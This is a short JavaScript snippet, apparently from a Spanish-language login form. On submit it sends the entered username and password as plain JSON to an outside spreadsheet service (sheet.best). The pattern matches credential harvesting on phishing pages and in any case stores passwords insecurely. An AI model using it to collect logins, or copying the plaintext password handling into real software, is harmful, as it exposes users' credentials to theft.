const formulario = document.getElementById('formulario');

formulario.addEventListener('submit', async (e) => {
  e.preventDefault();

  await fetch('https://sheet.best/api/sheets/6209b74c-839b-4583-a237-3ee3c51cb3e3', {
    method: 'POST',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      "Usuario": formulario.usuario.value,
      "Contraseña": formulario.contraseña.value
    })
  });


});
